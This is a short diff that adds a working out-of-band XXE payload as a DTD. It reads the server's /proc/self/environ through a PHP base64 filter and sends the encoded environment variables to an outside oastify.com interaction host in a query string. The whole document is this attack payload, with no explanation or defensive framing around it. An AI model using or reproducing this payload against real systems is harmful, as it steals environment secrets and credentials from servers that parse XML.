@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/environ">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://8irq83lvw2gy91gtmj0bxl1kvb12pvpje.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
